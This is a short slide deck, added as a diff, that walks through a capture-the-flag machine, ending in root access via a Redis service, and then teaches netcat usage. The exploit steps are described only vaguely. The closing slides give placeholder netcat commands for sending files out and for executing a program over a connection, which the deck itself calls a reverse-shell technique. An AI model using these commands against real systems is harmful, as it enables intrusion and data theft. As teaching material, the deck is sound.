@@ -1,0 +1,95 @@
+= nc (NetCat)
+Harish
+
+== CTF challange
+
+image::figure/shared_1.png[align="center",width="50%"]
+
+== ** **
+
+* Need to get 2 **flags**(files)
+  - User Flag -> `/home/<user>/user.txt`
+  - Root Flag -> `/root/root.txt`
+
+== ** **
+* It was a Private IP Address.
+
+* So, They provide a `OpenVPN profile` to connect to their LAN.
+
+image::figure/tun0.png[align="center",width="75%"]
+
+
+== USER FLAG
+
+* Somehow, Able to get `user.txt` file. 
+
+* After exploiting through the web server.
+
+image::figure/user-txt.png[align="center",width="75%"]
+
+== Privilege Escalation
+
+* After some enumeration found a file.
+  - **redis_connector_dev** under `/usr/local/bin`
+
+image::figure/redis_connector_perm.png[align="center",width="75%"]
+ 
+* Executed on the machine nothing happens.
+
+image::figure/redis_connect_targ.png[align="center", width="75%"]
+
+== Analysis
+
+* Downloaded the binary to local machine.
+
+* It was a ELF file. Tried extracting Strings.
+  - Nothing useful 
+
+* Executed on sandboxed env. It was trying to send data to port 6379(redis db port).
+
+image::figure/exec_redis_connect.png[align="center", width="60%"]
+
+== ROOT FLAG
+
+=== Left
+
+* Using `nc` create a listener on Port 6379. To see the message.
+
+* Then, Exploited redis db with some public exploit.
+
+* Finally got the root flag.
+
+=== Right
+
+image::figure/nc_listen.png[align="center", width="100%"]
+
+image::figure/connected.png[align="center", width="100%"]
+
+== Netcat
+
+* Read and write to the network connection via TCP and UDP.
+
+* Ex. Sending Message:
+
+** Server : `nc -lvp 80`
+
+** Client : `nc <server-ip> <server-port>` 
+
+== More on nc
+
+* Sending Files
+
+** Sender: `nc <ip> <port>  < message.txt`
+** Receiver: `nc -lvp 80 > received.txt`
+
+* Executing Commands
+
+** `nc -lvp 80`
+** `nc <ip> <port> -e /file/to/execute`
+
+** This feature was removed from ubuntu to protect from reverse shell.
+
+
+== Thank you
+
+* `man nc`
